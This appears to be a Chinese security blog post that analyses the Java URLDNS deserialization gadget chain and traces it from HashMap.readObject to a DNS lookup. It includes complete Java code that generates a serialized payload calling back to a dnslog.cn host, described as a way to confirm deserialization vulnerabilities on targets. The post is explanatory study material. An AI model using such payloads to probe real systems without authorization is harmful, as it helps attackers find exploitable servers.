---
title: URLDNS链
date: 2026-03-20
updated: 2026-03-20
tags:
  - 链子
categories:
  - 链子
description: URLDNS链
draft: false
---
根据已知 Payload，进行正向分析

```java
import java.io.*;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class URLDNSDemo {
    public static void main(String[] args) throws Exception {
        // 1. 创建一个 HashMap
        HashMap<URL, Integer> hashMap = new HashMap<>();

        // 2. 创建一个 URL 对象，指向你的 DNS 记录地址（可以使用 dnslog.cn 等工具获取）
        URL url = new URL("http://5rbma3.dnslog.cn");

        // --- 关键坑点处理：通过反射绕过本地查询 ---
        // 在 put 进 HashMap 时，为了防止在生成 payload 的阶段就触发 DNS 请求，
        // 需要先修改 URL 对象的 hashCode 缓存字段。
        Field hashCodeField = Class.forName("java.net.URL")
                .getDeclaredField("hashCode");
        hashCodeField.setAccessible(true);

        // 设置为非 -1，这样 put 的时候就不会触发 DNS 查询
        hashCodeField.set(url, 123);

        // 3. 将 URL 放入 HashMap
        hashMap.put(url, 1);

        // 4. put 完之后，再改回 -1，这样在对方服务器反序列化时才会触发查询
        hashCodeField.set(url, -1);

        // --- 模拟序列化过程 ---
        ObjectOutputStream oos = new ObjectOutputStream(
                new FileOutputStream("urldns.ser"));
        oos.writeObject(hashMap);
        oos.close();
        System.out.println("Payload 已生成：urldns.ser");

        // --- 模拟反序列化过程（相当于攻击目标执行的操作） ---
        System.out.println("正在模拟反序列化...");
        ObjectInputStream ois = new ObjectInputStream(
                new FileInputStream("urldns.ser"));
        ois.readObject(); // 触发 DNS 请求
        ois.close();
    }
}
```

模拟攻击触发，断点 `ois.readObject()` 调试进入 `HashMap.readObject()`，循环读取 Key 和 Value，会调用 `hash()` 方法

> HashMap 存储元素依赖 Key 的哈希值定位桶位置。反序列化时，HashMap 的 readObject 方法会读取数据并调用 put 方法重新插入元素。此时会根据 Key 对象当前的状态重新计算哈希值，确定桶位置。

![[attachments/20260320.png]]

跟进，若传入的 key 不是 null 则调用 `key.hashCode()`，key 的类型是 URl，下一步就是 URL 中的 `hashCode()`

![[attachments/20260320-1.png]]

hashCode 属性不为 -1 时直接返回，则不会触发 hashCode 方法，即不会触发后面的 DNS 解析。

hashCode 默认值为 -1 ，所以会执行 `handler.hashCode()`

![[attachments/20260320-2.png]]

这里的 handler 是 `URLStreamHandler` 类（Java 中用于处理不同协议（http、https、ftp 等）URL 行为的类。）

![[attachments/20260320-5.png]]

跟进，调用 `getHostAddress` 方法对传入的 URL 对象进行解析

![[attachments/20260320-3.png]]

随后会调用 `getHost` 方法，然后调用 `InetAddress.getByName(host)` 发起 DNS 请求，至此整个过程完毕。

![[attachments/20260320-4.png]]

```
ois.readObject() <=> ObjectInputStream.readObject()
HashMap::readObject()
	->putVal()
	->hash()
	->URL::hashCode()
	->URLStreamHandler::hashCode()
	->getHostAddress()
	->getByName()
```

- 入口点 (Source)：`java.util.HashMap.readObject()`
- 跳板点 (Gadget)：`java.net.URL.hashCode()`
- 出口点 (Sink)：`java.net.URLStreamHandler.getHostAddress()`（最终触发 DNS 解析）

关键利用
- 用的是 java 内部的类进行构造，不依赖第三方库
- 若目标可出网，却无回显，可用来验证是否存在反序列化漏洞